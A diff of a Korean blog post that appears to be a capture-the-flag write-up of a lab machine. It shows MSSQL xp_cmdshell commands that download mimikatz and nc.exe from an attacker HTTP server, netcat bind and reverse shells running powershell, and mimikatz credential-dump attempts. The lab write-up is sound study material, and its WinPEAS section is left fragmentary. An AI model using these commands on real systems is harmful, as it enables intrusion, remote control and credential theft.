@@ -12,6 +12,7 @@ image:
 ![](../assets/image_post/20240216110356.png)
 ---
 
+### Scan
 우선 nmap으로 먼저 스캔해보자. 아래와 같이 탐지 내역이 꽤 많다. `rpc`, `smb`, `mssql` 관련된 port가 활성화 되어있는 것을 알 수 있다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
@@ -69,6 +70,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
+### SMB
 smbclient를 통해 어떤 공유 항목이 있는지 확인해보자. 아래와 같이 backups가 존재한다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
@@ -111,7 +113,7 @@ sql 계정으로 추청되는 id, pw 값 획득이 가능하다.
     </Configuration>
 </DTSConfiguration>
 ```
-
+### SQL logon - Fail
 mssql-cli를 설치하여 실행해보려 햇으나, mssql-cli 자체가 실행 시 오류를 발생시켜 해당 도구로는 테스트하지 못했다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
@@ -131,7 +133,8 @@ Couldn't find a valid ICU package installed on the system. Set the configuration
 ![](../assets/image_post/20240216154546.png)
 
 
-그리하여 마지막으로 rpcclient로 해당 계정으로 접근해보았더니, 접근이 된다...! dfsConfig는 SQL 관련 패키지 속성 값인데 왜 rpc와 관련이 있는 것일까......하지만 마찬가지로 별다른 정보를 획득할 수는 없는 것 같다.
+### SQL logon - Success 
+마지막으로 rpcclient로 해당 계정으로 접근해보았더니, 접근이 된다...! dfsConfig는 SQL 관련 패키지 속성 값인데 왜 rpc와 관련이 있는 것일까......하지만 마찬가지로 별다른 정보를 획득할 수는 없는 것 같다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
 └─# rpcclient -U sql_svc 10.129.215.129
@@ -155,7 +158,7 @@ rpcclient $> srvinfo
         server type     :       0x59007
 ```
 
-RPC Endpoint를 열거하기 위해 `impacket--rpcdump`를 사용해보고자 한다. 이거로 획득한 정보는 있지만, 어디에 사용해야할지는 감이 없다.
+RPC Endpoint를 열거하기 위해 `impacket--rpcdump`를 사용해보고자 한다. 이거로 획득한 정보는 있지만, 어디에 사용해야할지는 감이 없다. 
 ``` bash
 ┌──(root㉿kali)-[/home/user]
 └─# impacket-rpcdump -port 135 10.129.95.187
@@ -252,6 +255,7 @@ output
 Access is denied.
 ```
 
+### File Transfer - Fail
 권한 상승을 위해 파일을 전달할 방법으로 처음에 사용했던 smb를 다시 사용해보고자 했다. 하지만 쓰기 권한이 없어 실패한다.
 ``` bash
 smb: \> put rfi.php rfi.php
@@ -282,17 +286,121 @@ curl: (6) Could not resolve host: raw.githubusercontent.com
 NULL
 ```
 
-nc.exe를 대상 서버로 업로드하여 연결을 시도하였으나 실패하였다. 아래는 리버스쉘(서버->클라이언트 접속)을 사용하는 명령어이다.
 
-- Server 역할을 하는 공격자
+
+### File Transfer - Success
+공격 대상 서버로 각종 파일을 옮길 때 아래와 같이 옮기면 된다. 공격자 서버에는 `python -m http.server`를 띄워놓은 상태이다.
 ``` bash
-┌──(root㉿kali)-[/home/user]
-└─# nc -lvp 8000
-listening on [any] 8000 ...
-10.129.231.29: inverse host lookup failed: Unknown host
-connect to [10.10.14.175] from (UNKNOWN) [10.129.231.29] 49686
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell curl -o C:\Users\Public\mimi.exe http://10.10.14.175:8000/mimi.exe
+output
+--------------------------------------------------------------------------------
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+100 1059k  100 10       0     0   200k      0  0:00:05  0:00:01  0:00:04  126k
+
+59k    0     0   529k      0  0:00:02  0:00:02 --:--:--  445k
+
+NULL
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell curl -o C:\Users\Public\nc.exe http://10.10.14.175:8000/nc.exe
+output
+--------------------------------------------------------------------------------
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+100 59392  100 59392    0     0  59392      0  0:00:01  0:00:01 --:--:-- 56725
+
+NULL
 ```
-- Client 역할을 하는 희생자
+
+### Bind&Reverse Shell
+nc.exe를  전송하였기에 아래와 같이 기본적인 바인드 쉘 연결을 할 수 있다.
 ``` bash
-SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell C:/Users/Public/nc.exe 10.10.14.175 8000
+# 공격 대상 서버
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\nc.exe -lvp 443 -e powershell
+
+# 공격자 서버
+┌──(root㉿kali)-[~user]
+└─# nc 10.129.41.155 443
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
 ```
+
+아래는 리버스 쉘을 연결할 때의 명령어다.
+``` bash
+# 공격 대상 서버
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\nc.exe 10.10.14.175 443 -e powershell
+
+# 공격자 서버
+┌──(root㉿kali)-[~user]
+└─# nc -lvp 443
+listening on [any] 443 ...
+10.129.41.155: inverse host lookup failed: Unknown host
+connect to [10.10.14.175] from (UNKNOWN) [10.129.41.155] 49682
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
+```
+
+
+### Mimikatz
+mimikatz를 통해 윈도우 계정 정보 획득을 시도해보았다. 현재 계정 `sql_svc`로 실행하였기에 아래 ERROR 문구와 같이 권한이 없다고 나온다. 역시 권한을 먼저 상승시켜야 할 것 같다.
+``` bash
+PS C:\Users\Public> .\mimi.exe
+.\mimi.exe
+
+  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonPasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+mimikatz # privilege::debug
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+```
+
+### WinPEAS
+이 부분 역시 공략을 참고하였다. 문제 풀이 과정 중 아래 문제의 정답을 도저히 모르기에, 결국 참고하였다. 말 그대로라면 권한 상승이 가능한 부분을 보여준다는 신기한 도구이다.
+> What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+
+해당 파일은 [Github](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)에서 다운로드 가능하며, 나의 경우 bat 형태로 받아 이전의 File Transfer 과정을 거쳐 대상 서버에 다운로드하였다.
+```
+ Volume in d
+
+```
+
+
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell net share
+output
+-------------------------------------------------------------------------------
+Share name   Resource                        Remark
+-------------------------------------------------------------------------------
+IPC$                                         Remote IPC
+C$           C:\                             Default share
+ADMIN$       C:\Windows                      Remote Admin
+backups      C:\backups
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir C:\backups
+output
+-----------------------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\backups
+
+01/20/2020  04:20 AM    <DIR>          .
+01/20/2020  04:20 AM    <DIR>          ..
+01/20/2020  04:23 AM               609 prod.dtsConfig
+```
+
